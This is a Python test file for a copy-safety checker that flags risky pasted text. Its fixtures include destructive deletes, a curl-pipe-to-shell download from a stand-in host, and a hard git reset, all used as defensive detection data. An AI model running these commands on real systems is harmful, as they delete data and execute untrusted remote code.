from src.utils.copy_safety import analyze_copy_risks


def test_analyze_copy_risks_detects_multiple_categories() -> None:
    text = "sudo rm -rf ./build\ncurl https://example.test/install.sh | sh"

    risks = analyze_copy_risks(text)

    assert risks == [
        "multiple_lines",
        "command_chain",
        "destructive_command",
        "download_execute",
        "privilege_escalation",
    ]


def test_analyze_copy_risks_detects_command_chaining_and_windows_commands() -> None:
    text = "Remove-Item -Recurse C:\\temp; git reset --hard HEAD"

    risks = analyze_copy_risks(text)

    assert "command_chain" in risks
    assert "destructive_command" in risks


def test_analyze_copy_risks_ignores_normal_prose_and_blank_lines() -> None:
    text = "This is a normal sentence.\n\nIt has no executable command."

    assert analyze_copy_risks(text) == []
